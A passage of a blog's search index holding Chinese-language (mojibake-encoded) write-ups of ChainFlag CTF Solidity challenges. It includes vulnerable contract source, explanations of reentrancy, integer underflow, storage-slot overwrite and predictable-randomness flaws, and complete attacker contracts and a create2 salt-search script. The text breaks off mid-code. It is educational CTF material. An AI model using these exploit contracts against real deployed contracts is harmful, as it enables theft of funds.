shl(1, add(0x32FE,0x1))))let hacker := create2(selfbalance(), 0x200, 2, 0) ä½¿ç”¨0x32FFè¿™ä¸¤ä¸ªå­—èŠ‚ä½œä¸ºbytcodeåˆ›å»ºåˆçº¦ï¼Œå…¶å«ä¹‰ä¸ºselfdestruct(tx.origin)ï¼Œæˆ‘ç¬¬ä¸€æ¬¡è§è¿˜å¯ä»¥è¿™æ ·åˆ›å»ºåˆçº¦çš„ï¼Œç›´æ¥è‡ªæ¯ï¼Œåˆç”±äºFFè¢«ç¦æ­¢ä½¿ç”¨ï¼Œæ‰€ä»¥é‡‡ç”¨äº†add(0x32FE,0x1)ï¼Œéšåå°†0x32FFç§»åŠ¨åˆ°32bytesçš„é«˜16ä½ã€‚ 12345/* å·¦ç§»240ä½çš„åŸå› ï¼š å¯¹äºä¸€æ®µbytecodeï¼ŒEVMçš„è¯»å–æ–¹å¼ä¸ºä»å·¦åˆ°å³ï¼Œå³ä»é«˜ä½åˆ°ä½ä½ï¼Œ mstore(offset, value) å­˜å‚¨æ–¹å¼ä¸ºä½ä½å­˜å‚¨ï¼Œé«˜ä½ç•™ç©ºï¼Œä¸”å­˜å‚¨çš„å¤§å°ä¸º32byteså³256ä½ï¼Œ0x32FFå äº†4*4=16(bit)ï¼Œæ‰€ä»¥éœ€è¦å·¦ç§» 32bytes(256bit) - 16bit = 240(0XF0)bit*/ StArNDBOX runtimecodeå¯ä»¥é€šè¿‡constructoræ¥æ§åˆ¶ï¼Œå³åœ¨æ„é€ å™¨ä¸­ä½¿ç”¨å†…è”æ±‡ç¼–è¿”å›æŒ‡å®šçš„runtimecodeï¼Œå³ä½¿åˆçº¦ä¸­è¿˜æœ‰å…¶ä»–çš„å‡½æ•°ï¼ŒæŒ‰ç†æ¥è¯´é‚£äº›å‡½æ•°çš„åŠŸèƒ½åº”è¯¥æ˜¯è¢«ç¼–ç åœ¨runtimecodeä¸­ï¼Œå¦‚æœæ„é€ å™¨ä¸­returnï¼Œåˆ™çœŸæ­£çš„runtimecodeä¸ºreturnçš„å€¼ã€‚ å¦‚ä¸‹æ˜¯æœ‰æ— æ„é€ å™¨æ—¶çš„bytcodeï¼š ç”±ç»“æœå¯çŸ¥ï¼ŒçŒœæƒ³æ­£ç¡®ï¼Œæ ¼å±€æ‰“å¼€ğŸ¤‘ã€‚ Creativity å­¦ä¼šäº†å¦‚ä½•å®ç°åŒä¸€ä¸ªåœ°å€éƒ¨ç½²ä¸åŒçš„runtimecodeï¼ŒçœŸçš„æ„Ÿè§‰å¾ˆç¥å¥‡ï¼ åœ¨ä¼ bytesç±»å‹çš„æ•°æ®æ—¶ï¼Œ 123bytes memory code = &quot;0x32FF&quot;; // è¿™æ ·æ˜¯é”™è¯¯çš„ï¼Œè¯»å–çš„ç»“æœé 0x32FF// åº”è¯¥è¿™æ ·å†™bytes memory code = hex&quot;32FF&quot;; å‚è€ƒé“¾æ¥ Link1é¢˜è§£ Link2é¢˜è§£ Link3EVMruntimecodeçš„å­¦ä¹  Link4metadata å¾ˆæœ‰æ„æ€çš„æ‹“å±•å­¦ä¹  12345678910111213141516171819202122232425262728293031323334353637pragma solidity ^0.4.24;contract HoneyPot &#123; bytes internal constant ID = hex&quot;60203414600857005B60008080803031335AF100&quot;; constructor () public payable &#123; bytes memory contract_identifier = ID; assembly &#123; return(add(0x20, contract_identifier), mload(contract_identifier)) &#125; &#125; function withdraw() public payable &#123; require(msg.value &gt;= 1 ether); msg.sender.transfer(address(this).balance); &#125;&#125;contract HoneyPotHacker &#123; HoneyPot pot; constructor(address _pot) public &#123; pot = HoneyPot(_pot); &#125; function pwn() external payable &#123; require(msg.value == 0x20); pot.withdraw.value(msg.value)(); &#125; function balanceOf(address target) external view returns(uint) &#123; return target.balance; &#125; function() external payable&#123;&#125;&#125;","categories":[{"name":"CTFS","slug":"CTFS","permalink":"https://biyouqiuqiu.com/categories/CTFS/"},{"name":"ChainFlag","slug":"CTFS/ChainFlag","permalink":"https://biyouqiuqiu.com/categories/CTFS/ChainFlag/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://biyouqiuqiu.com/tags/CTF/"},{"name":"soliditiy","slug":"soliditiy","permalink":"https://biyouqiuqiu.com/tags/soliditiy/"}]},{"title":"defi(1)âŒ","slug":"CTFS/ChainFlag/defi/defi","date":"2023-08-26T07:50:10.000Z","updated":"2023-08-26T07:50:10.000Z","comments":true,"path":"2023/08/26/CTFS/ChainFlag/defi/defi/","link":"","permalink":"https://biyouqiuqiu.com/2023/08/26/CTFS/ChainFlag/defi/defi/","excerpt":"","text":"defi â€” ä»£ç é‡å¤ªå¤šäº†1. question 2. analysis 3. solve","categories":[{"name":"CTFS","slug":"CTFS","permalink":"https://biyouqiuqiu.com/categories/CTFS/"},{"name":"ChainFlag","slug":"CTFS/ChainFlag","permalink":"https://biyouqiuqiu.com/categories/CTFS/ChainFlag/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://biyouqiuqiu.com/tags/CTF/"},{"name":"soliditiy","slug":"soliditiy","permalink":"https://biyouqiuqiu.com/tags/soliditiy/"}]},{"title":"storage(5)","slug":"CTFS/ChainFlag/storage/storage(5)","date":"2023-08-26T07:10:10.000Z","updated":"2023-08-26T07:10:10.000Z","comments":true,"path":"2023/08/26/CTFS/ChainFlag/storage/storage(5)/","link":"","permalink":"https://biyouqiuqiu.com/2023/08/26/CTFS/ChainFlag/storage/storage(5)/","excerpt":"","text":"Happy_DOuble_Eleven1. questionæºç  123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148pragma solidity ^0.4.23;interface Tmall &#123; function Chop_hand(uint) view public returns (bool);&#125;contract Happy_DOuble_Eleven &#123; address public owner; bool public have_money; bytes32[] public codex; bool public have_chopped; uint public hand; mapping (address =&gt; uint) public balanceOf; mapping (address =&gt; uint) public mycart; mapping (address =&gt; uint) public level; event pikapika_SendFlag(string b64email); constructor() public &#123; owner = msg.sender; &#125; function payforflag(string b64email) onlyOwner public &#123; require(uint(msg.sender) &amp; 0xfff == 0x111); require(level[msg.sender] == 3); require(mycart[msg.sender] &gt; 10000000000000000000); balanceOf[msg.sender] = 0; level[msg.sender] = 0; have_chopped = false; have_money = false; codex.length = 0; emit pikapika_SendFlag(b64email); &#125; modifier onlyOwner() &#123; require(msg.sender == owner); _; &#125; modifier first() &#123; uint x; assembly &#123; x := extcodesize(caller) &#125; require(x == 0); _; &#125; function _transfer(address _from, address _to, uint _value) internal &#123; require(_to != address(0x0)); require(_value &gt; 0); uint256 oldFromBalance = balanceOf[_from]; uint256 oldToBalance = balanceOf[_to]; uint256 newFromBalance = balanceOf[_from] - _value; uint256 newToBalance = balanceOf[_to] + _value; require(oldFromBalance &gt;= _value); require(newToBalance &gt; oldToBalance); balanceOf[_from] = newFromBalance; balanceOf[_to] = newToBalance; assert((oldFromBalance + oldToBalance) == (newFromBalance + newToBalance)); &#125; function transfer(address _to, uint256 _value) public returns (bool success) &#123; _transfer(msg.sender, _to, _value); return true; &#125; function Deposit() public payable &#123; if(msg.value &gt;= 500 ether)&#123; mycart[msg.sender] += 1; &#125; &#125; function gift() first &#123; require(mycart[msg.sender] == 0); require(uint(msg.sender) &amp; 0xfff == 0x111); balanceOf[msg.sender] = 100; mycart[msg.sender] += 1; level[msg.sender] += 1; &#125; function Chopping(uint _hand) public &#123; Tmall tmall = Tmall(msg.sender); if (!tmall.Chop_hand(_hand)) &#123; hand = _hand; have_chopped = tmall.Chop_hand(hand); &#125; &#125; function guess(uint num) public &#123; uint seed = uint(blockhash(block.number - 1)); uint rand = seed % 3; if (rand == num) &#123; have_money = true; &#125; &#125; function buy() public &#123; require(level[msg.sender] == 1); require(mycart[msg.sender] == 1); require(have_chopped == true); require(have_money == true); mycart[msg.sender] += 1; level[msg.sender] += 1; &#125; function retract() public &#123; require(codex.length == 0); require(mycart[msg.sender] == 2); require(level[msg.sender] == 2); require(have_money == true); codex.length -= 1; &#125; function revise(uint i, bytes32 _person) public &#123; require(codex.length &gt;= 0xfffffffffffffffffffffffffffffffffffffffffffffffffffffffffff00000); require(mycart[msg.sender] == 2); require(level[msg.sender] == 2); require(have_money == true); codex[i] = _person; if (codex.length &lt; 0xffffffffff000000000000000000000000000000000000000000000000000000)&#123; codex.length = 0; revert(); &#125; else&#123; level[msg.sender] += 1; &#125; &#125; function withdraw(uint _amount) onlyOwner public &#123; require(mycart[msg.sender] == 2); require(level[msg.sender] == 3); require(_amount &gt;= 100); require(balanceOf[msg.sender] &gt;= _amount); require(address(this).balance &gt;= _amount); balanceOf[msg.sender] -= _amount; msg.sender.call.value(_amount)(); mycart[msg.sender] -= 1; &#125;&#125; ğŸ“Œ æˆåŠŸè°ƒç”¨payforflag() 2. analysis è¿™é“é¢˜å¯Œå«çš„çŸ¥è¯†ç‚¹æ¯”è¾ƒå¤šï¼Œæ¶‰åŠäº†ï¼šé‡å…¥ï¼Œæº¢å‡ºï¼Œcreate2ï¼Œæ„é€ å™¨è°ƒç”¨è€…ä»£ç å¤§å°ä¸º0ï¼ŒåŠ¨æ€æ•°ç»„çš„è¦†ç›–å’Œæº¢å‡ºï¼Œæ„é€ ä¼ªéšæœºæ•°ï¼Œè‡ªå·±ç»™è‡ªå·±è½¬é’±ä½™é¢ç¿»å€æ¶¨ï¼Œè›®æœ‰æ„æ€ã€‚ åˆ†æï¼š gift() firstï¼šåœ¨æ„é€ å™¨ä¸­è°ƒç”¨ï¼Œæ»¡è¶³ codesize==0ï¼Œä¸”ä½¿å¾— mycart[msg.sender] == 1, level[msg.sender] == 1 Chopping()ï¼šæ”»å‡»è€…å¯ä»¥è‡ªå®šä¹‰Chop_handå‡½æ•°ï¼Œä»¤å…¶æ»¡è¶³ç¬¬ä¸€æ¬¡è°ƒç”¨ä¸ºfalseç¬¬äºŒæ¬¡è°ƒç”¨ä¸ºtrueå³å¯ï¼Œå‡½æ•°è°ƒç”¨å®Œæˆä¹‹åhave_chopped=true guess()ï¼šåˆ¶é€ ä¼ªéšæœºæ•°ï¼Œå‡½æ•°è°ƒç”¨å®Œæˆä¹‹åhave_money=true buy()ï¼šè°ƒç”¨è¯¥å‡½æ•°ï¼Œä½¿å¾—mycart[msg.sender] == 2, level[msg.sender] == 2 retract()ï¼šè°ƒç”¨è¯¥å‡½æ•°ï¼Œä½¿å¾—codex.lengthå‘ç”Ÿä¸‹æº¢ï¼Œä¸ºæ¥ä¸‹æ¥çš„ownerå€¼è¦†ç›–åšé“ºå« revise()ï¼šè®¡ç®—å‡ºæ•°ç»„çš„é•¿åº¦ï¼Œä½¿å…¶+1å‘ç”Ÿä¸Šæº¢ï¼Œè¦†ç›–æ‰ownerï¼Œä»¤å…¶æˆä¸ºhacker withdrawï¼šä¸éš¾çœ‹å‡ºï¼Œæ­¤æ—¶çš„mycart[msg.sender] == 2ï¼Œé™¤äº†ä¸»åŠ¨è°ƒç”¨withdrawå‡½æ•°ä¹‹å¤–ï¼Œè¿˜éœ€è¦è¿›è¡Œä¸¤æ¬¡é‡å…¥ä½¿å…¶å‘ç”Ÿæº¢å‡ºï¼Œä½†æ˜¯balanceçš„å˜é‡æ›´æ–°åœ¨è½¬è´¦ä¹‹å‰ï¼Œæ‰€ä»¥éœ€è¦æœ‰ä¸‰å€çš„è½¬è´¦èµ„é‡‘ï¼Œä¸éš¾çœ‹å‡ºï¼Œ_transferæœ‰å¤§é—®é¢˜ï¼Œä¹‹å‰åœ¨é‡å…¥ç¯‡å·²ç»åˆ†æè¿‡äº†ï¼Œå°±ä¸ç»†è¯´äº† ç»¼ä¸Šä¾¿æœ‰äº†æ”»å‡»åˆçº¦ 3. solveæ”»å‡»åˆçº¦ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102// SPDX-License-Identifier: MITpragma solidity ^0.8.0;interface Tmall &#123; function Chop_hand(uint) external returns (bool);&#125;interface IHappy_DOuble_Eleven&#123; function gift() external; function guess(uint num) external; function Chopping(uint _hand) external; function buy() external; function retract() external; function revise(uint i, bytes32 _person) external; function balanceOf(address user) external returns (uint); function transfer(address _to, uint256 _value) external returns (bool success); function withdraw(uint _amount) external; function payforflag(string memory b64email) external;&#125;contract Happy_DOuble_ElevenHacker is Tmall &#123; IHappy_DOuble_Eleven eleven; uint counter; uint fallback_counter; constructor(address _eleven) &#123; eleven = IHappy_DOuble_Eleven(_eleven); // 1. mycart[msg.sender] == 1, level[msg.sender] == 1, balanceOf[msg.sender] == 100 eleven.gift(); // create2 &#125; function pwn() external &#123; // 2. call guess() =&gt; have_money == true eleven.guess(uint(blockhash(block.number - 1)) % 3); // 3. call Chopping =&gt; have_chopped == true eleven.Chopping(0); // 4. call buy() =&gt; mycart[msg.sender] == 2, level[msg.sender] == 2 eleven.buy(); // 5. call retract() =&gt; codex.length == type(uint256).max eleven.retract(); // 6. call revise() =&gt; become owner, level[msg.sender] == 3 uint index_code_0 = uint(keccak256(abi.encodePacked(uint(1)))); // code[0]&#x27;s location uint index_owner = type(uint).max - index_code_0 + 1; // owner&#x27;s location = total - index_code_0 + 1 =&gt; slot0 eleven.revise(index_owner, bytes32(uint(uint160(address(this))))); // hacker become owner // 7. call transfer() for 2 times =&gt; balanceOf[msg.sender] = 400 for (uint i; i &lt; 2; i++) &#123; eleven.transfer(address(this), eleven.balanceOf(address(this))); &#125; // 8. make overflow =&gt; mycart[msg.sender] &gt; 10000000000000000000 eleven.withdraw(100); // 9. capture the flag eleven.payforflag(&quot;BYYQ1030&quot;); &#125; function Chop_hand(uint) external returns (bool) &#123; if (counter == 0) &#123; counter++; return false; &#125; return true; &#125; fallback() external payable &#123; if (fallback_counter &lt; 3) &#123; fallback_counter++; eleven.withdraw(100); &#125; &#125;&#125;contract Happy_DOuble_ElevenDeployer &#123; function deploy(uint _salt, address challenge) external returns (address hacker) &#123; bytes32 salt = keccak256(abi.encodePacked(_salt)); bytes memory bytecode = abi.encodePacked(type(Happy_DOuble_ElevenHacker).creationCode, abi.encode(challenge)); assembly &#123; hacker := create2(0, add(bytecode, 0x20), mload(bytecode), salt) &#125; &#125; function sendMoney(address payable to) external payable &#123; selfdestruct(to); &#125;&#125; cow1. questionæºç  1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374pragma solidity ^0.4.2;contract cow&#123; address public owner_1; address public owner_2; address public owner_3; address public owner; mapping(address =&gt; uint) public balance; struct hacker &#123; address hackeraddress1; address hackeraddress2; &#125; hacker h; constructor()public&#123; owner = msg.sender; owner_1 = msg.sender; owner_2 = msg.sender; owner_3 = msg.sender; &#125; event SendFlag(string b64email); function payforflag(string b64email) public &#123; require(msg.sender==owner_1); require(msg.sender==owner_2); require(msg.sender==owner_3); owner.transfer(address(this).balance); emit SendFlag(b64email); &#125; function Cow() public payable &#123; uint geteth=msg.value/1000000000000000000; if (geteth==1) &#123; owner_1=msg.sender; &#125; &#125; function cov() public payable &#123; uint geteth=msg.value/1000000000000000000; if (geteth&lt;1) &#123; hacker fff=h; fff.hackeraddress1=msg.sender; &#125; else &#123; fff.hackeraddress2=msg.sender; &#125; &#125; function see() public payable &#123; uint geteth=msg.value/1000000000000000000; balance[msg.sender]+=geteth; if (uint(msg.sender) &amp; 0xffff == 0x525b) &#123; balance[msg.sender] -= 0xb1b1; &#125; &#125; function buy_own() public &#123; require(balance[msg.sender]&gt;1000000); balance[msg.sender]=0; owner_3=msg.sender; &#125; &#125; ğŸ“Œ æˆåŠŸè°ƒç”¨payforflag() 2. analysis åšæ³•ï¼šé€æ­¥å é¢†å„ä¸ªowner Cow()ï¼šæˆä¸ºowner_1 cov()ï¼šæˆä¸ºowner_2ï¼Œä¸èƒ½èµ°ifè¯­å¥ï¼Œå› ä¸ºæ— æ³•è¦†ç›–åˆ°slot0çš„ä½ç½®ï¼Œå‰é¢æœ‰ç±»ä¼¼çš„é¢˜ï¼Œåªæœ‰åœ¨å‡½æ•°ä½“ä¸­å£°æ˜storageç±»å‹çš„ç»“æ„ä½“æ‰ä¼šè¿›è¡Œè¦†ç›–ï¼Œå¦‚æœåœ¨å‡½æ•°ä½“å¤–å£°æ˜ï¼ŒEVMåˆ™ä¼šäº‹å…ˆç»™ç»“æ„ä½“å¼€è¾Ÿç©ºé—´ã€‚ buy_own()ï¼šæˆä¸ºowner_3ï¼Œä½†æ˜¯éœ€è¦å…ˆé€šè¿‡see()ä½¿balance[msg.sender]å‘ç”Ÿä¸‹æº¢ 3. solveæ”»å‡»åˆçº¦ 123456789101112131415161718192021222324252627282930313233343536373839pragma solidity ^0.8.0;interface Icow &#123; function Cow() external payable; function cov() external payable; function see() external payable; function buy_own() external; function payforflag(string memory b64email) external;&#125;contract CowHacker &#123; Icow cow; function attack(address _cow) public payable &#123; require(msg.value == 3 ether, &quot;msg.value less than 3 ether&quot;); cow = Icow(_cow); cow.Cow&#123;value : 1 ether&#125;(); // æˆä¸ºowner_1 cow.cov&#123;value : 1 ether&#125;(); // æˆä¸ºowner_2 cow.see&#123;value : 1 ether&#125;(); // balance[msg.sender] å‘ç”Ÿæº¢å‡º cow.buy_own(); // æˆä¸ºowner_3 cow.payforflag(&quot;hacker&quot;); &#125; receive() external payable&#123;&#125;&#125;contract Deployer &#123; function deploy(uint _salt) public returns(address)&#123; bytes memory bytecode = type(CowHacker).creationCode; bytes32 salt = keccak256(abi.encodePacked(_salt)); address addr; assembly &#123; addr := create2(0, add(bytecode, 0x20), mload(bytecode), salt) &#125; return addr; &#125;&#125; rise1. questionæºç  123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899pragma solidity ^0.4.2;contract rise &#123; address referee; uint secret; uint bl; mapping(address =&gt; uint) public balance; mapping(address =&gt; uint) public gift; address owner; struct hacker &#123; address hackeraddress; uint value; &#125; constructor()public&#123; owner = msg.sender; referee = msg.sender; balance[msg.sender]=10000000; bl=1; secret=18487187377722; &#125; event SendFlag(string b64email); modifier onlyOwner()&#123; require(msg.sender == owner); _; &#125; modifier onlyRefer()&#123; require(msg.sender == referee); _; &#125; function payforflag(string b64email) public &#123; require(balance[msg.sender]&gt;1000000); balance[msg.sender]=0; bl=1; owner.transfer(address(this).balance); emit SendFlag(b64email); &#125; function airdrop() public &#123; require(gift[msg.sender]==0); gift[msg.sender]==1; balance[msg.sender]+=1; &#125; function deposit() public payable &#123; uint geteth=msg.value/1000000000000000000; balance[msg.sender]+=geteth; &#125; function set_secret(uint target_secret) public onlyOwner &#123; secret=target_secret; &#125; function set_bl(uint target_bl) public onlyRefer &#123; bl=target_bl; &#125; function risegame(uint guessnumber) public payable &#123; require(balance[msg.sender]&gt;0); uint geteth=msg.value/1000000000000000000; if (guessnumber==secret) &#123; balance[msg.sender]+=geteth*bl; bl=1; &#125; else &#123; balance[msg.sender]=0; bl=1; &#125; &#125; function transferto(address to) public &#123; require(balance[msg.sender]&gt;0); if (to !=0) &#123; balance[to]=balance[msg.sender]; balance[msg.sender]=0; &#125; else &#123; hacker storage h; h.hackeraddress=msg.sender; h.value=balance[msg.sender]; balance[msg.sender]=0; &#125; &#125; &#125; ğŸ“Œ æˆåŠŸè°ƒç”¨payforflag() 2. analysis airdrop()ï¼šç©ºæŠ•å‡½æ•°ï¼Œä½¿balance[msg.sender] != 0 deposit()ï¼šå†æ¬¡ä¸ºäº†balance[msg.sender] != 0 transferto()ï¼šæˆä¸ºrefereeï¼Œå¹¶å°†secretè®¾ç½®ä¸º1 set_blï¼šæé«˜å€ç‡ risegameï¼šå°†balanceå‡é«˜ 3. solveæ”»å‡»åˆçº¦ 1234567891011121314151617181920contract Hacker &#123; rise rise_; constructor(address _rise) public &#123; rise_ = rise(_rise); &#125; function attack() public payable &#123; require(msg.value == 2 ether); rise_.airdrop(); // è·å–ç©ºæŠ• rise_.transferto(address(0)); // æˆä¸ºrefereeï¼Œè®¾ç½®å¯†ç ä¸º1 rise_.deposit.value(1 ether)(); // ä½¿ balance[msg.sender] != 0 rise_.set_bl(1000001); // ä½¿ b1çš„å€¼å˜å¤§ rise_.risegame.value(1 ether)(1); // ä¸ºäº†æ»¡è¶³ 1 * 1000001 &gt; 1000000 rise_.payforflag(&quot;hacker&quot;); &#125; function() external payable&#123;&#125;&#125; roiscoin1. questionæºç  12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091929394959697pragma solidity ^0.4.23;contract FakeOwnerGame &#123; event SendFlag(address _addr); uint randomNumber = 0; uint time = now; mapping (address =&gt; uint) public BalanceOf; mapping (address =&gt; uint) public WinCount; mapping (address =&gt; uint) public FailCount; bytes32[] public codex; address private owner; uint256 settlementBlockNumber; address guesser; uint8 guess; struct FailedLog &#123; uint failtag; uint failtime; uint success_count; address origin; uint fail_count; bytes12 hash; address msgsender; &#125; mapping(address =&gt; FailedLog[]) FailedLogs; constructor() &#123; owner = msg.sender; &#125; modifier onlyOwner() &#123; require(msg.sender == owner); _; &#125; function payforflag() onlyOwner &#123; require(BalanceOf[msg.sender] &gt;= 2000); emit SendFlag(msg.sender); selfdestruct(msg.sender); &#125; function lockInGuess(uint8 n) public payable &#123; require(guesser == 0); require(msg.value == 1 ether); guesser = msg.sender; guess = n; settlementBlockNumber = block.number + 1; &#125; function settle() public &#123; require(msg.sender == guesser); require(block.number &gt; settlementBlockNumber); uint8 answer = uint8(keccak256(block.blockhash(block.number - 1), now)) % 2; if (guess == answer) &#123; WinCount[msg.sender] += 1; BalanceOf[msg.sender] += 1000; &#125; else &#123; FailCount[msg.sender] += 1; &#125; if (WinCount[msg.sender] == 2) &#123; if (WinCount[msg.sender] + FailCount[msg.sender] &lt;= 2) &#123; guesser = 0; WinCount[msg.sender] = 0; FailCount[msg.sender] = 0; msg.sender.transfer(address(this).balance); &#125; else &#123; FailedLog failedlog; failedlog.failtag = 1; failedlog.failtime = now; failedlog.success_count = WinCount[msg.sender]; failedlog.origin = tx.origin; failedlog.fail_count = FailCount[msg.sender]; failedlog.hash = bytes12(sha3(WinCount[msg.sender] + FailCount[msg.sender])); failedlog.msgsender = msg.sender; FailedLogs[msg.sender].push(failedlog); &#125; &#125; &#125; function beOwner() payable &#123; require(address(this).balance &gt; 0); if(msg.value &gt; address(this).balance)&#123; owner = msg.sender; &#125; &#125; function revise(uint idx, bytes32 tmp) &#123; if(uint(msg.sender) &amp; 0x61 == 0x61 &amp;&amp; tx.origin != msg.sender) &#123; codex[idx] = tmp; &#125; &#125;&#125; ğŸ“Œ æˆåŠŸè°ƒç”¨payforflag() 2. analysis è¿™é“é¢˜å¾ˆå¥ˆæ–¯ï¼ è¦æ±‚æˆä¸ºownerï¼Œå¹¶ä¸”BalanceOf[msg.sender] &gt;= 2000ã€‚ åˆ†æ lockInGuess()ï¼šé”å®šguessï¼Œå¹¶æˆä¸ºçŒœé¢˜äººï¼ˆä¸ºäº†æˆåŠŸè°ƒç”¨settleï¼‰ settle()ï¼šèƒ½å¤Ÿè¿›è¡Œä¸€äº›å˜é‡çš„è¦†ç›–ï¼Œå°¤å…¶é‡è¦çš„æ˜¯æ•°ç»„codexçš„é•¿åº¦ï¼Œä¸ºäº†èƒ½è¿›è¡Œå˜é‡è¦†ç›–ï¼Œå¿…é¡»è¿›å…¥åˆ°å¦‚ä¸‹çš„elseè¯­å¥ä¸­ 123456if (WinCount[msg.sender] == 2) &#123; if ()&#123; ... &#125; else &#123; // è¿™é‡Œåˆ«æœ‰ä¸€ç•ªå¤©åœ° &#125; æ‰€ä»¥è¿™ä¾¿è¦æ±‚äº†çŒœé¢˜çš„æ¬¡æ•°åˆ†é…å¦‚ï¼šå¿…é¡»çŒœå¯¹ä¸¤æ¬¡ï¼Œä¸”çŒœé”™çš„æ¬¡æ•°å¤§äºç­‰äº1 å½“å±æœ€éš¾ä¾¿æ˜¯å¯¹äºæ•°ç»„é•¿åº¦çš„è¦†ç›–ğŸ˜­ğŸ˜­ğŸ˜­ 123456789// åœ¨FailedLog ç»“æ„ä½“ä¸­,è¿™ä¸¤ä¸ªå€¼å ç”¨çš„ç©ºé—´åˆšå¥½ä¸º 32bytes bytes12 hash; address msgsender;// è¿™ä¸¤ä¸ªå€¼è¿›è¡Œæ’æ§½è¦†ç›–çš„æ—¶å€™ï¼Œä¾¿æ˜¯å¯¹æ•°ç»„ codex çš„é•¿åº¦è¿›è¡Œè¦†ç›–ï¼Œ// è€Œä¸”è¿™å¾ˆæœ‰æ„æ€ï¼Œé«˜20ä½ä¸º`msg.sender`ï¼Œä½12bytesä½ä¸º`bytes12(...)`// æˆ‘çš„ç†è§£æ˜¯å…ˆæ­£å¸¸å°†bytes12(...)æ”¾è¿›slotä¸­ï¼Œåå‘ç°addressç±»å‹ä»å¯ä»¥åœ¨è¯¥slotä¸­å­˜å‚¨ï¼Œä¾¿å°†å‰20bytesä½ç”¨äºå­˜æ”¾msg.senderfailedlog.hash = bytes12(sha3(WinCount[msg.sender] + FailCount[msg.sender]));failedlog.msgsender = msg.sender; é€šè¿‡è®¡ç®—å¯çŸ¥ï¼Œä»codex[0]åˆ°å­˜å‚¨ownerå˜é‡çš„â€è·ç¦»â€ä¸º owner_index codex_length &#x3D; 114245411204874937970903528273105092893277201882823832116766311725579567940175 123uint codex_0 = uint(keccak256(abi.encodePacked(uint(5)))); // codex[0]æ‰€åœ¨ä½ç½®uint codex_length = type(uint256).max - codex_0; // codexæ•°ç»„åˆ°EVMå­˜å‚¨ç©ºé—´æœ«å°¾çš„è·ç¦»uint owner_index = codex_length + 7; // å˜é‡ownerç›¸å¯¹äºæ•°ç»„çš„ä½ç½® é€šè¿‡å®è·µå¯ä»¥å‘ç°ï¼Œåªè¦msg.senderæ˜¯ä»¥ffæˆ–feå¼€å¤´çš„åœ°å€ï¼Œé‚£ä¹ˆä»–ä»¬æ‹¼å‡‘å‡ºæ¥çš„å€¼ä¾¿ä¼šå¤§äºcodex_lengthã€‚ æœ€åï¼Œæœ€ç¦»è°±çš„æ˜¯ï¼Œé‡Œé¢æœ‰ä¸ªéª—å­å‡½æ•°beOwner() è¿™å°±æ˜¯ä¸ªæ— åº•æ´ï¼Œæ°¸è¿œä¹Ÿæ— æ³•ä»è¯¥å‡½æ•°æˆä¸ºownerï¼Œä¸ä¿¡ä½ æ¥è¯•è¯•çœ‹ã€‚ 3. solveè®¡ç®—è„šæœ¬ï¼š 123456789101112131415161718192021222324252627282930import &#123; ethers &#125; from &quot;ethers&quot;const const_num = &quot;0xFF&quot;;const contract_add = &quot;&quot;; // depolyer&#x27;addresslet str1 = const_num + contract_add.slice(2,contract_add.length);const bytecode = &quot;&quot;; // hacker&#x27;bytecodeconst bytecodeToHash = ethers.utils.solidityKeccak256([&#x27;bytes&#x27;],[bytecode]);let salt = 0;while (true) &#123; let saltToHash = ethers.utils.solidityKeccak256([&#x27;uint&#x27;],[salt]); saltToHash = saltToHash.slice(2, saltToHash.length) let str2 = str1.concat(saltToHash).concat(bytecodeToHash.slice(2,bytecodeToHash.length)); let hash = ethers.utils.solidityKeccak256([&#x27;bytes&#x27;] ,[str2]); if ((hash.slice(26, 28) == &quot;ff&quot; || hash.slice(26, 28) == &quot;fe&quot; ) &amp;&amp; hash.slice(hash.length - 2, hash.length) == &quot;61&quot;) &#123; console.log(`salt = $&#123;salt&#125;`); console.log(`address = 0x$&#123;hash.slice(26, hash.length)&#125;`); break; &#125; salt++;&#125; æ”»å‡»åˆçº¦ æ”»å‡»é€»è¾‘ï¼šå…ˆé€šè¿‡è„šæœ¬è®¡ç®—å‡ºæ¥çš„ç›éƒ¨ç½²å‡ºhackeråˆçº¦çš„å®ä¾‹ï¼Œâ‘ è°ƒç”¨hackerçš„attack1()å‡½æ•°ï¼Œå¹¶æ”¯ä»˜1 ethterï¼›â‘¡ä¸€ç›´è°ƒç”¨attack2()å‡½æ•°ï¼ˆå¯èƒ½ä¼šå‡ºç°è°ƒç”¨å¤±è´¥çš„æƒ…å†µä½†æ˜¯ä¸å½±å“ï¼Œåªè¦ä¸€ç›´è°ƒç”¨ä¾¿ä¼šæ­£å¸¸ï¼‰ï¼Œç›´åˆ°wintimes == 2ï¼Œfailtimes &gt;= 1ä¸ºæ­¢ï¼›â‘¢è°ƒç”¨attack3()å‡½æ•°ï¼Œå³å®Œæˆæ”»å‡» 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081pragma solidity ^0.8.0;interface IFakeOwnerGame&#123; function lockInGuess(uint8 n) external payable; function settle() external; function payforflag() external; function revise(uint idx, bytes32 tmp) external;&#125;contract FakeOwnerGameHack&#123; IFakeOwnerGame game; address owner; uint public wintimes; uint public failtimes; constructor() &#123; owner = msg.sender; &#125; function attack1(address _game) public payable &#123; require(msg.value == 1 ether, &quot;msg.value != 1 ether&quot;); game = IFakeOwnerGame(_game); game.lockInGuess&#123;value:1 ether&#125;(1); &#125; // å¤šæ¬¡è°ƒç”¨è¯¥å‡½æ•°ï¼Œç›´åˆ° wintimes == 2ï¼Œä¸”failtimesä¸ä¸º0 function attack2() external &#123; uint8 answer = uint8(uint(keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp)))) % 2; if (answer == 1) &#123; if (wintimes == 2) return; game.settle(); game.settle(); wintimes += 2; &#125; else &#123; game.settle(); failtimes++; &#125; if (wintimes == 2) &#123; require(failtimes != 0, &quot;failtimes is zero,try again...&quot;); &#125; &#125; function attack3() public &#123; // 